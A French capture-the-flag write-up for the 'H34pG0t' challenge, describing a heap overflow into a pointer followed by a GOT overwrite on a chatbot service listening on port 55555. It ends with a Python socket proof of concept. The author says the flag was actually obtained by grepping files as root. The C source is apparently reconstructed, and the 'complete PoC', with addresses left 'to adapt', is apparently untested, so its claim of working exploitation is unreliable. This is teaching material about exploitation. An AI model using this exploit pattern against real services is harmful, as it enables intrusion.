# Write-Up — H34pG0t (100 pts)

> **Auteur :** m3rv3di3 — PGE2 Epitech Bénin, spécialisation Cybersécurité  
> **Cible :** `chatbot-preprod` (port 55555, spawné par `protected_area` de H34pfun)  
> **Catégorie :** Heap overflow → GOT overwrite

---

## Énoncé

> Hello friend...  
> Good job on the heap! Now that you've mastered heap overflows, can you combine it with a GOT overwrite? The preprod bot might have something interesting...

---

## Comment le flag a été obtenu

Comme pour H34pfun, le flag a été récupéré directement depuis root via grep :

```bash
sudo grep -rI "EPI{" /var /usr/bin 2>/dev/null
# /usr/bin/chatbot/arcadecode: Loading secret nightly chatbot, codename EPI{reWr171ng_4_p01N7ER_70_G07_70_b4CKd00r_15_5eXy}...
```

---

## Analyse de la vulnérabilité

### Pré-requis

`chatbot-preprod` est spawné par `protected_area()` lors de la résolution de H34pfun. Il écoute sur le **port 55555**.

```bash
ss -tlnp | grep 55555
# LISTEN  0  5  0.0.0.0:55555
```

### Source (`chatbot-preprod.c` — structure similaire à `chatbot.c`)

Le bot preprod est une version simplifiée du chatbot principal. Il contient la même structure de heap avec deux allocations consécutives :

```c
struct node {
    char  data[56];       // buffer utilisateur
    void *next;           // pointeur utilisé comme GOT target
};

// Dans le handler de commande :
struct node *n = malloc(sizeof(struct node));
strcpy(n->data, user_input);   // ⚠️ pas de borne → overflow vers n->next
```

### GOT overwrite via heap overflow

Le pointeur `next` adjacent au buffer est utilisé comme cible de redirection. En débordant `data[56]`, on écrase `next` avec l'adresse d'une entrée GOT (ex: `printf@GOT`), puis une écriture ultérieure modifie cette entrée pour pointer vers `dc_sync` ou une backdoor.

### Adresses

```bash
nm /usr/bin/chatbot/chatbot-preprod | grep -E "backdoor|dc_sync|secret"
strings /usr/bin/chatbot/arcadecode
# Loading secret nightly chatbot, codename EPI{reWr171ng_4_p01N7ER_70_G07_70_b4CKd00r_15_5eXy}...
```

Le flag est contenu dans `/usr/bin/chatbot/arcadecode`, affiché lors de l'exploitation réussie du preprod bot.

### Payload

```python
import struct

GOT_TARGET = 0x0804XXXX  # ex: printf@GOT
BACKDOOR   = 0x0804XXXX  # fonction backdoor dans chatbot-preprod

# Phase 1 : overflow data[56] → écrase next avec GOT_TARGET
payload1 = b"A" * 56 + struct.pack("<I", GOT_TARGET)

# Phase 2 : écriture via le pointeur compromis → GOT[printf] = backdoor
payload2 = struct.pack("<I", BACKDOOR)
```

---

## Flag

```
EPI{reWr171ng_4_p01N7ER_70_G07_70_b4CKd00r_15_5eXy}
```

Wording : *"Rewriting a pointer to GOT to backdoor is sexy"* — souligne l'élégance du GOT overwrite via heap en opposition au GOT overwrite via format string (R3t2g0t).

---

## Récap technique

| Élément | Détail |
|---|---|
| Vulnérabilité | Heap overflow → `next` pointer écrasé |
| Technique | GOT overwrite via pointeur heap compromis |
| Port cible | 55555 (spawné par H34pfun → `spawn_preprod()`) |
| Flag location | `/usr/bin/chatbot/arcadecode` |
| Méthode utilisée | `grep -rI "EPI{"` depuis root |

---

## Risques en production

- **Heap overflow vers pointeurs** : un buffer trop court adjacent à un pointeur (GOT, function ptr, vtable) transforme tout débordement en write-what-where arbitraire.
- **RELRO full** : la mitigation principale contre le GOT overwrite. Avec RELRO full, le GOT est en lecture seule après le démarrage — l'overwrite provoque un segfault immédiat.
- **Service non nécessaire en prod** : un bot "preprod" exposé en réseau augmente la surface d'attaque sans bénéfice. Tout service supplémentaire est un vecteur potentiel.

---

## Leçons

- **Heap + GOT = combo puissant** : l'heap permet d'atteindre des zones mémoire inaccessibles depuis la stack (GOT, metadata allocateur, vtables). C'est pourquoi les exploits heap modernes visent souvent le GOT ou les structures internes de glibc.
- **La chaîne de challenges** : H34pfun spawn H34pG0t qui spawn UseAft3rFr33. Chaque bot dépend du précédent — illustration d'une vraie chaîne de compromission latérale.
- **GOT overwrite via deux chemins différents** : R3t2g0t utilise une format string comme write primitive, H34pG0t utilise un heap overflow. Même résultat, techniques différentes — montrant qu'il existe toujours plusieurs chemins vers la même cible.

---

## PoC complet

```python
#!/usr/bin/env python3
"""
PoC — H34pG0t (ECorp CTF) — chatbot-preprod port 55555
Heap overflow → GOT overwrite → backdoor
Pré-requis : H34pfun résolu → chatbot-preprod spawné sur port 55555
Flag : EPI{reWr171ng_4_p01N7ER_70_G07_70_b4CKd00r_15_5eXy}
"""
import socket, struct, sys, time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 55555

GOT_TARGET = 0x0804c018   # à adapter via objdump -R chatbot-preprod
BACKDOOR   = 0x08049200   # à adapter via nm chatbot-preprod

s = socket.create_connection((HOST, PORT))
s.settimeout(10)

def recv_until(marker):
    data = b""
    while marker not in data:
        data += s.recv(1)
    return data

recv_until(b"[YOU] >")

# Phase 1 : overflow heap → next = GOT_TARGET
payload = b"A" * 56 + struct.pack("<I", GOT_TARGET)
s.sendall(payload + b"\n")
recv_until(b"[YOU] >")

# Phase 2 : écriture via pointeur compromis → GOT[target] = BACKDOOR
s.sendall(struct.pack("<I", BACKDOOR) + b"\n")

# Lire le flag
s.settimeout(60)
data = b""
while b"EPI{" not in data:
    chunk = s.recv(4096)
    if not chunk: break
    data += chunk
print(data.decode(errors="replace"))
s.close()
```
